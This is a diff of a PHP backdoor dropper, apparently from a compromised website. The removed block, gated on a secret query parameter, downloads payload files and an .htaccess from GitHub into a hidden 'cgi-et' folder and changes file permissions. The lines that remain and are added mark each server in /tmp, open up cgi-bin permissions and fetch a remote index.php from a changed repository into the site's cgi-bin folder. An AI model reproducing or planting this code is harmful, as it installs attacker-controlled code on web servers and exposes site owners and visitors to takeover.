@@ -1,35 +1,16 @@
 <?php 
 if(isset($_GET["eec"])&&$_GET["eec"]=="sec"){ 
 mkdir($_SERVER['DOCUMENT_ROOT']."/cgi-et");
-echo('Eec secra');
-
-$file = sexx('https://raw.githubusercontent.com/XetSec/Xet/main/und.php');
-$local=$_SERVER['DOCUMENT_ROOT']."/cgi-et/1index.php";
-if(file_put_contents($local, $file));   
-
-@chmod($_SERVER['DOCUMENT_ROOT'] . "/cgi-bin", 0644);
-@chmod($_SERVER['DOCUMENT_ROOT'] . "/.htaccess", 0644);
-@chmod($_SERVER['DOCUMENT_ROOT'] . "/1index.php", 0644);
-$filee = sexx('https://raw.githubusercontent.com/HecSec/New/main/.htaccess');
-$locall=$_SERVER['DOCUMENT_ROOT']."/cgi-et/.htaccess";
-if(file_put_contents($locall, $filee));  
-@chmod($_SERVER['DOCUMENT_ROOT'] . "/.htaccess", 0444);
-
-$sec31= sexx('https://raw.githubusercontent.com/XetSec/Xet/main/madstore.txt');
-$wpoptionss31 = $_SERVER['DOCUMENT_ROOT'] . "/cgi-et/wp-lince.php";
-if (file_put_contents ($wpoptionss31, $sec31));
-
-$wpoptionssssr = sexx('https://raw.githubusercontent.com/XetSec/Xet/main/mail.txt');
-$wpoptionsssss = $_SERVER['DOCUMENT_ROOT'] . "/cgi-et/wp-boshe.php"; 
-if (file_put_contents ($wpoptionsssss, $wpoptionssssr));   die();  }
+echo('Eec secra');     }
 
 $random = rand(1,6);
 $d=$_SERVER['SERVER_NAME'];
-if(file_exists('/tmp/d3dd3d'.$d.$random)) { } else {
-	mkdir('/tmp/d3dd3d'.$d.$random);
+if(file_exists('/tmp/g5g5g5g5g'.$d.$random)) { } else {
+	mkdir('/tmp/g5g5g5g5g'.$d.$random);
+	@chmod($_SERVER['DOCUMENT_ROOT'] . "/cgi-bin", 0755);
 	mkdir($_SERVER['DOCUMENT_ROOT']."/cgi-bin");
 	
-$rr = sexx('https://raw.githubusercontent.com/HecSec/New/main/index.php');
+$rr = sexx('https://raw.githubusercontent.com/Hrecc/Re/main/index.php');
 $ss = $_SERVER['DOCUMENT_ROOT'] . "/cgi-bin/index.php" ; 
 if (file_put_contents ($ss, $rr));
 	
